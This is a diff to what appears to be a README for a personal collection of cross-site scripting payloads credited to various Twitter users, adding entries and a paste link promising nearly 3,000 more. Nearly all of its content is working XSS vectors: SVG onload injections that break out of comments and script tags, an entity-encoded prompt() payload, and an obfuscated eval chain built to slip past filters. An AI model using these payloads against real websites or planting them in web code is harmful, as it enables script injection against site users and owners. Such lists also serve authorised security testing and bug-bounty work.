@@ -2,6 +2,9 @@ This is a list of XSS payloads Ive found whlst browsing the Internet
 I cant take credit for most of these, so I'll link and credit where i can.
 
 
+--><Svg OnLoad=(confirm)(`XSS`)><!--
+=1</Script/><Svg/OnLoad=(confirm)(`OPENBUGBOUNTY`)>
+
 Twitter : @bohdansec
 
 # <svg onload=prompt%26%230000000040document.domain)>
@@ -11,4 +14,6 @@ Twitter : @aemkei
 
 # x = 91419154914591629164950961951n;[`'${x}'`.replace(/9/g, "\\")].map(eval).map(eval)
 
-# --><Svg OnLoad=(confirm)(`XSS`)><!--
+Nearly 3 thousand payloads !
+
+https://ghostbin.co/paste/qo23j
